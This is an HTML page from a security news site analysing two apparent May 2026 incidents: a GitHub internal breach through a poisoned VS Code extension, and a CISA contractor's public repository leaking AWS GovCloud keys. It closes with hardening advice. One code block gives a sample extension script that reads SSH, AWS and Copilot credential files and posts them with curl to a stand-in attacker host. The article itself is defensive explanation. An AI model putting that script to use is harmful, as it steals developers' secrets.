@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The May 2026 Git Leaks: From Malicious VS Code Extensions to CISA's Exposed Secrets | TheHGTech</title>
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="The May 2026 Git Leaks: From Malicious VS Code Extensions to CISA's Exposed Secrets | TheHGTech">
+    <meta name="twitter:description" content="Technical analysis of the recent GitHub internal repository breach by TeamPCP and the CISA contractor Nightwing public repo leak. Includes defense strategies for security engineers.">
+    <meta name="twitter:image" content="https://thehgtech.com/images/articles/github-cisa-leaks-2026.png">
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="The May 2026 Git Leaks: From Malicious VS Code Extensions to CISA's Exposed Secrets | TheHGTech">
+    <meta property="og:description" content="Technical analysis of the recent GitHub internal repository breach by TeamPCP and the CISA contractor Nightwing public repo leak. Includes defense strategies for security engineers.">
+    <meta property="og:image" content="https://thehgtech.com/images/articles/github-cisa-leaks-2026.png">
+    <meta property="og:url" content="https://thehgtech.com/article-github-cisa-leaks-2026.html">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="TheHGTech">
+    <link rel="canonical" href="https://thehgtech.com/article-github-cisa-leaks-2026.html">
+
+    <meta name="description"
+        content="Technical analysis of the recent GitHub internal repository breach by TeamPCP and the CISA contractor Nightwing public repo leak. Includes defense strategies for security engineers.">
+
+    <!-- Style System - FULL SET REQUIRED -->
+    <link rel="stylesheet" href="/header.css">
+    <link rel="stylesheet" href="/header-dropdown.css?v=1">
+    <link rel="stylesheet" href="/print.css">
+    <link rel="stylesheet" href="/m-core.css?v=4.2">
+    <link rel="stylesheet" href="/m-layout.css?v=3.2">
+    <link rel="stylesheet" href="/m-components.css?v=3.0">
+    <link rel="stylesheet" href="/light-mode.css">
+    <link rel="stylesheet" href="/interaction-bar.css?v=20251207-0041">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="ui-enhancements.css?v=20260517">
+
+    <style>
+        :root {
+            --bg-primary: #0a0a0a;
+            --text-primary: #fff;
+            --text-secondary: #aaa;
+            --accent-cyan: #00D9FF;
+            --border: rgba(255, 255, 255, 0.1);
+            --code-bg: #111;
+        }
+        body { 
+            font-family: 'Inter', -apple-system, sans-serif; 
+            background: var(--bg-primary); 
+            color: var(--text-primary); 
+            line-height: 1.8;
+            padding: 0;
+            margin: 0;
+        }
+        article {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 80px 1.5rem 120px;
+        }
+        article h1 {
+            font-size: 1.75rem;
+            background: linear-gradient(135deg, var(--accent-cyan), #FF3D3D);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+        }
+        article h2 { color: var(--accent-cyan); margin: 2rem 0 1rem; font-size: 1.4rem; }
+        article h3 { color: var(--text-primary); margin: 1.5rem 0 0.75rem; font-size: 1.2rem; }
+        article p { color: var(--text-secondary); margin-bottom: 1rem; }
+        article ul, article ol { color: var(--text-secondary); margin-left: 1.5rem; margin-bottom: 1rem; }
+        article li { margin-bottom: 0.5rem; }
+        article strong { color: var(--text-primary); }
+        .hero-image { width: 100%; border-radius: 12px; margin-bottom: 2rem; border: 1px solid var(--border); box-shadow: 0 10px 30px rgba(0, 217, 255, 0.1); }
+        .success-box {
+            background: rgba(0, 217, 255, 0.05);
+            border-left: 4px solid var(--accent-cyan);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+        .technical-box {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+        }
+        .technical-box h3 { margin-top: 0; color: var(--accent-cyan); display: flex; align-items: center; gap: 0.5rem; }
+        .technical-box pre { margin: 0; padding: 1rem; background: #000; border-radius: 4px; overflow-x: auto; }
+        .technical-box code { font-family: 'Fira Code', monospace; color: #a5d6ff; font-size: 0.9rem; }
+        @media (max-width: 768px) {
+            article h1 { font-size: 1.5rem; }
+        }
+        .light-mode body { background: #fff; color: #1a1a1a; }
+        .light-mode article p { color: #555; }
+        .light-mode article h1 { background: linear-gradient(135deg, #0077aa, #c41e3a); -webkit-background-clip: text; }
+        .light-mode .technical-box { background: #f8f9fa; border-color: #e5e7eb; }
+        .light-mode .technical-box pre { background: #282c34; }
+    </style>
+
+    <!-- ========== GLOBAL THEME SCRIPT ========== -->
+    <script>
+        (function() {
+            var savedTheme = localStorage.getItem("theme");
+            if (savedTheme === "light" || (!savedTheme && window.matchMedia("(prefers-color-scheme: light)").matches)) {
+                document.documentElement.setAttribute("data-theme", "light");
+                document.body.classList.add("light-mode");
+            }
+        })();
+    </script>
+    
+    <!-- ========== ANALYTICS (MANDATORY) ========== -->
+    <script>
+        window.addEventListener('load', function () {
+            setTimeout(function () {
+                var gtmScript = document.createElement('script');
+                gtmScript.async = true;
+                gtmScript.src = 'https://www.googletagmanager.com/gtag/js?id=G-XL6RCXZJE2';
+                document.head.appendChild(gtmScript);
+                gtmScript.onload = function () {
+                    window.dataLayer = window.dataLayer || [];
+                    function gtag() { dataLayer.push(arguments); }
+                    window.gtag = gtag;
+                    gtag('js', new Date());
+                    gtag('config', 'G-XL6RCXZJE2');
+                };
+            }, 100);
+        });
+    </script>
+    <script>
+        window.addEventListener('load', function () {
+            var fullres = document.createElement('script');
+            fullres.async = true;
+            fullres.src = 'https://t.fullres.net/thehgtech.js?' + (new Date() - new Date() % 43200000);
+            document.head.appendChild(fullres);
+        });
+    </script>
+
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Article",
+        "headline": "The May 2026 Git Leaks: From Malicious VS Code Extensions to CISA's Exposed Secrets | TheHGTech",
+        "description": "Technical analysis of the recent GitHub internal repository breach by TeamPCP and the CISA contractor Nightwing public repo leak. Includes defense strategies for security engineers.",
+        "image": "https://thehgtech.com/images/articles/github-cisa-leaks-2026.png",
+        "url": "https://thehgtech.com/article-github-cisa-leaks-2026.html",
+        "datePublished": "2026-05-20",
+        "dateModified": "2026-05-20",
+        "author": {
+            "@type": "Organization",
+            "name": "TheHGTech",
+            "url": "https://thehgtech.com"
+        },
+        "publisher": {
+            "@type": "Organization",
+            "name": "TheHGTech",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://thehgtech.com/logo-dark.png"
+            }
+        },
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https://thehgtech.com/article-github-cisa-leaks-2026.html"
+        }
+    }
+    </script>
+    <link rel="stylesheet" href="/mobile-nav.css">
+</head>
+
+<body>
+    <!-- ========== SMART MOBILE HEADER ========== -->
+    <header class="m-header m-only">
+        <div class="m-header__logo">
+            <a href="/" style="display: flex; align-items: center; gap: 0.75rem; text-decoration: none;">
+                <img src="/logo-dark.png" alt="TheHGTech" class="m-logo-img logo-dark" style="height: 28px; width: auto; margin: 0;">
+                <img src="/logo-light.png" alt="TheHGTech" class="m-logo-img logo-light" style="height: 28px; width: auto; margin: 0; display: none;">
+                <span style="font-size: 1.2rem; font-weight: 700; background: linear-gradient(135deg, #FF3D3D, #ff8c8c); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">TheHGTech</span>
+            </a>
+        </div>
+        <div class="m-header__actions">
+            <button class="m-header__btn" id="m-theme-toggle-top" aria-label="Toggle Theme">
+                <i class="fas fa-moon"></i>
+            </button>
+            <button class="m-header__btn" data-action="command-palette" aria-label="Search">
+                <i class="fas fa-search"></i>
+            </button>
+            <button class="m-header__btn" id="m-hamburger-btn" aria-label="Menu">
+                <i class="fas fa-bars"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- ========== FULLSCREEN MOBILE MENU OBSERVER ========== -->
+    <div class="m-menu-overlay m-only" id="m-menu-overlay">
+        <div class="m-menu-header">
+            <span style="font-size: 1.2rem; font-weight: 700; color: var(--text-primary);">Navigation</span>
+            <button class="m-menu-close" id="m-menu-close-btn" aria-label="Close Menu">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+        <div class="m-menu-content">
+            <div class="m-menu-section">
+                <div class="m-menu-title">Intelligence</div>
+                <a href="/threat-intel.html" class="m-menu-link"><i class="fas fa-shield-alt"></i> Threat Intel</a>
+                <a href="/cve-tracker.html" class="m-menu-link"><i class="fas fa-bug"></i> CVE Tracker</a>
+                <a href="/hacker-chatter.html" class="m-menu-link"><i class="fas fa-search"></i> Hacker Chatter</a>
+                <a href="/ransomware-tracker.html" class="m-menu-link"><i class="fas fa-skull-crossbones"></i> Ransomware</a>
+            </div>
+            <div class="m-menu-section">
+                <div class="m-menu-title">Resources</div>
+                <a href="/guides/" class="m-menu-link"><i class="fas fa-book"></i> Security Guides</a>
+                <a href="/articles.html" class="m-menu-link"><i class="fas fa-newspaper"></i> Articles & News</a>
+                <a href="/comparisons/" class="m-menu-link"><i class="fas fa-balance-scale"></i> Tool Comparisons</a>
+            </div>
+            <div class="m-menu-section">
+                <div class="m-menu-title">Tools</div>
+                <a href="/tools/grc-assessment/" class="m-menu-link"><i class="fas fa-clipboard-check"></i> GRC Assessment</a>
+                <a href="/workflows/" class="m-menu-link"><i class="fas fa-cogs"></i> n8n Workflows</a>
+            </div>
+            <div class="m-menu-section">
+                <div class="m-menu-title">Settings</div>
+                <button class="m-menu-theme-btn" onclick="toggleTheme(); if(typeof updateMenuThemeLabel === 'function') updateMenuThemeLabel();">
+                    <i class="fas fa-moon" id="m-menu-theme-icon"></i> <span id="m-menu-theme-text">Toggle Dark Mode</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Desktop Header -->
+    <header class="header" role="banner">
+        <div class="header-content">
+            <div class="logo">
+                <a href="/index.html" style="text-decoration: none; display: flex; align-items: center; gap: 0.75rem;">
+                    <img src="/logo-dark.png" alt="TheHGTech Logo" class="logo-img logo-dark">
+                    <img src="/logo-light.png" alt="TheHGTech Logo" class="logo-img logo-light">
+                    <span class="logo-text">TheHGTech</span>
+                </a>
+            </div>
+            <nav class="nav nav-modern" role="navigation">
+                <a href="/index.html#news">News</a>
+                
+                <div class="nav-dropdown">
+                    <span class="nav-dropdown-trigger">
+                        Intelligence
+                        <span class="nav-live-badge">LIVE</span>
+                        <i class="fas fa-chevron-down dropdown-arrow"></i>
+                    </span>
+                    <div class="nav-dropdown-panel">
+                        <a href="/threat-intel.html" class="dropdown-item">
+                            <div class="dropdown-item-icon intel"><i class="fas fa-satellite-dish"></i></div>
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Threat Intelligence <span class="dropdown-badge live">LIVE</span></div>
+                                <div class="dropdown-item-desc">Live IOCs from 9 trusted feeds, updated every 4 hours</div>
+                            </div>
+                        </a>
+                        <a href="/cve-tracker.html" class="dropdown-item">
+                            <div class="dropdown-item-icon cve"><i class="fas fa-bug"></i></div>
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">CVE Tracker</div>
+                                <div class="dropdown-item-desc">CISA KEV + NVD critical vulnerabilities with EPSS scores</div>
+                            </div>
+                        </a>
+                        <a href="/ransomware-tracker.html" class="dropdown-item">
+                            <div class="dropdown-item-icon ransomware"><i class="fas fa-skull-crossbones"></i></div>
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Ransomware Tracker</div>
+                                <div class="dropdown-item-desc">Track active ransomware groups and victims</div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                
+                <div class="nav-dropdown">
+                    <span class="nav-dropdown-trigger">
+                        Resources
+                        <i class="fas fa-chevron-down dropdown-arrow"></i>
+                    </span>
+                    <div class="nav-dropdown-panel">
+                        <a href="/guides/" class="dropdown-item">
+                            <div class="dropdown-item-icon guides"><i class="fas fa-book"></i></div>
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Security Guides <span class="dropdown-badge popular">37+</span></div>
+                                <div class="dropdown-item-desc">ISO 27001, NIST, SOC2, incident response & more</div>
+                            </div>
+                        </a>
+                        <a href="/comparisons/" class="dropdown-item">
+                            <div class="dropdown-item-icon comparisons"><i class="fas fa-balance-scale"></i></div>
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Tool Comparisons</div>
+                                <div class="dropdown-item-desc">EDR, SIEM, and security tool head-to-head reviews</div>
+                            </div>
+                        </a>
+                        <div class="dropdown-divider"></div>
+                        <a href="/articles.html" class="dropdown-item">
+                            <div class="dropdown-item-icon articles"><i class="fas fa-newspaper"></i></div>
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Articles</div>
+                                <div class="dropdown-item-desc">Latest cybersecurity news and analysis</div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                
+                <div class="theme-toggle-wrapper">
+                    <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+                        <div class="toggle-stars">
+                            <div class="star"></div>
+                            <div class="star"></div>
+                            <div class="star"></div>
+                            <div class="star"></div>
+                        </div>
+                    </button>
+                </div>
+            </nav>
+            
+            <button class="mobile-menu-btn" aria-label="Toggle menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </div>
+    </header>
+
+    <div class="container">
+        <a href="/articles.html" class="back-link" style="display: inline-block; margin-bottom: 1.5rem; color: var(--accent-cyan); text-decoration: none;">
+            <i class="fas fa-arrow-left"></i> Back to Articles
+        </a>
+
+        <article>
+            <img src="/images/articles/github-cisa-leaks-2026.png" alt="The May 2026 Git Leaks" class="hero-image">
+            <header>
+                <h1>The May 2026 Git Leaks: From Malicious VS Code Extensions to CISA's Exposed Secrets</h1>
+                <p><strong>Author:</strong> Harish G</p>
+                <p><strong>Published:</strong> May 20, 2026</p>
+            </header>
+
+            <h2>Executive Summary</h2>
+            <p><strong>BLUF:</strong> In mid-May 2026, the cybersecurity landscape was rocked by two entirely separate but highly damaging Git-related incidents. First, a threat actor group known as TeamPCP successfully breached GitHub's internal infrastructure, exfiltrating over 3,800 internal repositories via a compromised employee workstation. Almost simultaneously, a contractor working for the US Cybersecurity and Infrastructure Security Agency (CISA) inadvertently exposed highly sensitive AWS GovCloud keys in a public GitHub repository.</p>
+            <ul>
+                <li><strong>Confidence Level:</strong> Confirmed. Both GitHub and the involved contractors have acknowledged the incidents.</li>
+                <li><strong>TLP:</strong> CLEAR / GREEN</li>
+                <li><strong>Threat Actors:</strong> TeamPCP (GitHub Incident), Accidental Insider Threat (CISA Incident).</li>
+            </ul>
+            <p><em>This analysis is based on public disclosures, threat intelligence reports, and security researcher analyses as of May 20, 2026; details may evolve.</em></p>
+
+            <h2>Incident 1: The TeamPCP GitHub Internal Breach</h2>
+            <p>On the surface, a platform that hosts the world's code being compromised sounds like a doomsday scenario. However, the vector of attack highlights a critical vulnerability in modern developer workflows: <strong>the supply chain of our IDEs</strong>.</p>
+            
+            <h3>The Attack Vector: Poisoned VS Code Extensions</h3>
+            <p>TeamPCP (also tracked as UNC6780) didn't brute-force GitHub's servers or find a zero-day in their authentication protocol. They targeted the weakest link: a developer's workstation. By utilizing a "poisoned" Microsoft Visual Studio Code (VS Code) extension, they were able to gain persistent access to the corporate device of a GitHub employee.</p>
+            
+            <p>This malicious extension bypassed endpoint detection mechanisms by disguising itself as a legitimate developer tool. Once active, it captured authentication tokens, session cookies, and potentially SSH keys used to access GitHub's internal environments.</p>
+
+            <div class="technical-box">
+                <h3><i class="fas fa-code"></i> The Exploit Primitive: Rogue VS Code Extensions</h3>
+                <p>Malicious VS Code extensions often execute Node.js scripts in the background, utilizing the `vscode` API or spawning child processes to exfiltrate secrets. Here is an example of what an obfuscated payload inside a seemingly benign `extension.js` might look like:</p>
+                <pre><code class="language-javascript">// Example Detection Primitive: Malicious Extension Exfiltrating Secrets
+const cp = require('child_process');
+const fs = require('fs');
+
+// Attempt to read common SSH and AWS credential locations
+const paths = [
+    `${process.env.HOME}/.ssh/id_rsa`,
+    `${process.env.HOME}/.aws/credentials`,
+    `${process.env.HOME}/.config/github-copilot/hosts.json`
+];
+
+paths.forEach(p => {
+    if (fs.existsSync(p)) {
+        const data = fs.readFileSync(p, 'base64');
+        // Exfiltrate to actor-controlled infrastructure
+        cp.exec(`curl -X POST -d "${data}" https://teampcp-c2.example.com/exfil`);
+    }
+});</code></pre>
+            </div>
+
+            <p><strong>The Impact:</strong> Approximately 3,800 internal GitHub repositories were stolen and are currently listed for sale on cybercrime forums for an estimated $50,000. GitHub asserts that no customer repositories or non-internal systems were compromised. The company immediately isolated the device, revoked the malicious extension, and rotated all high-impact credentials and cryptographic keys.</p>
+
+            <h2>Incident 2: Nightwing and the CISA GovCloud Exposure</h2>
+            <p>While the GitHub breach was a targeted attack, the second major incident in May 2026 was a catastrophic failure of basic secrets management. A public repository belonging to an employee of Nightwing—a government contractor for CISA—was discovered by GitGuardian researchers to be leaking 844 MB of sensitive data.</p>
+            
+            <p>The leak contained plaintext passwords, internal infrastructure code, and most alarmingly, <strong>AWS GovCloud keys</strong>. GovCloud is Amazon's isolated cloud infrastructure designed to host sensitive data and regulated workloads for the US government.</p>
+
+            <h3>The Mechanics of the Leak</h3>
+            <p>The developer likely committed their local `.env` or `credentials` file directly to a public Git repository. This is a common error when developers use `git add .` without a properly configured `.gitignore` file. Despite CISA's status as the nation's premier cybersecurity agency, their contractors' failure to utilize basic pre-commit hooks or secret scanning tools led to a severe exposure.</p>
+
+            <div class="success-box">
+                <strong><i class="fas fa-shield-alt"></i> THE REALITY OF PUBLIC GITHUB LEAKS:</strong>
+                <p>Threat actors deploy bots that monitor the GitHub Firehose (the public events API) 24/7. When a secret is pushed to a public repository, it is typically scraped and weaponized within <strong>3 seconds</strong>. If you leak an AWS key, you must assume it is compromised instantly, even if you delete the commit minutes later.</p>
+            </div>
+
+            <h2>How to Prevent These Attacks (A Security Engineer's Guide)</h2>
+            <p>Both of these incidents, while vastly different in execution, stem from failures in controlling the developer environment and managing secrets. Here is how you can harden your infrastructure against these threats.</p>
+
+            <h3>1. Defending Against Malicious Extensions</h3>
+            <p>The VS Code marketplace has historically struggled with malicious packages and typo-squatting. Relying on developers to "make good choices" is not a security strategy.</p>
+            <ul>
+                <li><strong>Implement Extension Whitelisting:</strong> Use Mobile Device Management (MDM) or group policies to restrict which VS Code extensions can be installed on corporate devices. You can enforce policies via the `settings.json` or registry keys that block the installation of unapproved extensions.</li>
+                <li><strong>Endpoint Detection and Response (EDR) Tuning:</strong> Monitor for child processes spawned by `code.exe` (or the macOS/Linux equivalents) that attempt to read sensitive directories like `~/.ssh`, `~/.aws`, or execute unauthorized network connections.</li>
+            </ul>
+
+            <h3>2. Eradicating Hardcoded Secrets</h3>
+            <p>The Nightwing/CISA incident is entirely preventable with modern tooling.</p>
+            <ul>
+                <li><strong>Pre-Commit Hooks:</strong> Enforce the use of tools like <strong>Talisman</strong> or <strong>TruffleHog</strong> as pre-commit hooks. These tools will scan staged files for high-entropy strings (passwords, API keys) and block the commit before it ever reaches the remote repository.</li>
+                <li><strong>Automated Secret Scanning:</strong> Enable GitHub Advanced Security (GHAS) or integrate third-party tools like GitGuardian across all your organizations. Ensure alerts are routed immediately to the SOC.</li>
+                <li><strong>Zero-Trust and Ephemeral Credentials:</strong> Move away from long-lived static credentials like AWS IAM Access Keys. Instead, utilize AWS IAM Roles Anywhere, OIDC federation (e.g., GitHub Actions to AWS via OIDC), and short-lived, automatically rotating tokens via HashiCorp Vault.</li>
+            </ul>
+
+            <h3>3. Post-Incident Response Automation</h3>
+            <p>If a credential <em>does</em> leak, your response time must be faster than the threat actor's scraping bots.</p>
+            <ul>
+                <li><strong>Automated Revocation:</strong> Set up SOAR playbooks that trigger automatically when a secret is detected. If a Slack alert fires for a leaked AWS key, the playbook should automatically disable the IAM user or revoke the key within seconds, rather than waiting for human intervention.</li>
+            </ul>
+
+            <h2>Conclusion</h2>
+            <p>The May 2026 Git Leaks serve as a stark reminder that our development environments are prime targets. Whether it's a sophisticated threat group weaponizing an IDE extension to steal thousands of internal repositories, or a contractor accidentally pushing GovCloud keys to the public internet, the fundamental lesson remains the same: <strong>Security must be built into the developer workflow, not bolted on as an afterthought.</strong></p>
+            
+            <p>Assume your endpoints will be compromised. Assume your developers will accidentally commit secrets. Build your zero-trust architecture, automated scanning, and revocation pipelines to mitigate the blast radius when those assumptions become reality.</p>
+
+            <div class="article-footer" style="margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--border);">
+                <p><strong>Author:</strong> Harish G</p>
+                <p><strong>Published:</strong> May 20, 2026</p>
+                <p><strong>Last Updated:</strong> May 20, 2026</p>
+            </div>
+        </article>
+
+        <div class="interaction-bar">
+            <div class="like-section">
+                <button class="like-btn" id="likeBtn" onclick="toggleLike()">
+                    <i class="far fa-heart"></i> <span id="likeText">Like this article</span>
+                </button>
+            </div>
+            <div class="action-buttons">
+                <div class="share-buttons">
+                    <a href="#" onclick="shareTwitter(event)" class="share-btn" title="Share on Twitter"><i class="fab fa-twitter"></i></a>
+                    <a href="#" onclick="shareLinkedIn(event)" class="share-btn" title="Share on LinkedIn"><i class="fab fa-linkedin-in"></i></a>
+                    <button onclick="copyLink()" class="share-btn" title="Copy Link"><i class="fas fa-link"></i></button>
+                </div>
+                <div class="button-separator"></div>
+                <button onclick="window.print()" class="print-btn" title="Print Article"><i class="fas fa-print"></i></button>
+            </div>
+        </div>
+
+        <footer>
+            <p style="text-align: center; color: var(--text-muted); padding: 2rem;">&copy; 2026 TheHGTech. All rights reserved.</p>
+        </footer>
+
+        <script src="/interaction-bar.js?v=20260220"></script>
+        <script src="/m-app.js?v=4.3" defer></script>
+    </div>
+</body>
+</html>
